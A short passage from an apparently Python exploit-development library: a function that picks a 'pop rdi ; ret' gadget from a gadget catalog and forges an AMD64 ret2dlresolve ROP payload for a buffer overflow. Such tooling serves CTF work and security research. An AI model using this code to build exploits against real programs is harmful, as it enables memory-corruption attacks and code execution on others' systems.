) -> PayloadBuild:
    """Select AMD64 argument setup from a supplied catalog and forge dlresolve."""

    if catalog.architecture != "amd64":
        raise BuildError("catalog ret2dlresolve currently requires amd64")
    result = build_ret2dlresolve(
        plt0=plt0, rel_plt=rel_plt, dynsym=dynsym, dynstr=dynstr,
        relocation_target=relocation_target,
        pop_rdi=_catalog_address(catalog, "pop rdi ; ret"),
        payload_address=payload_address,
        overflow_offset=overflow_offset,
        glibc_version=glibc_version,
        architecture="amd64",
        symbol=symbol,
        argument=argument,
        resolver_return=resolver_return,
        fill=fill,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload, result.placements, result.widths,
        architecture=result.architecture,
        strategy="ret2dlresolve-from-catalog",
        base_address=result.base_address,
        metadata={**dict(result.metadata), "catalog_entry": hex(catalog.entry)},
    )

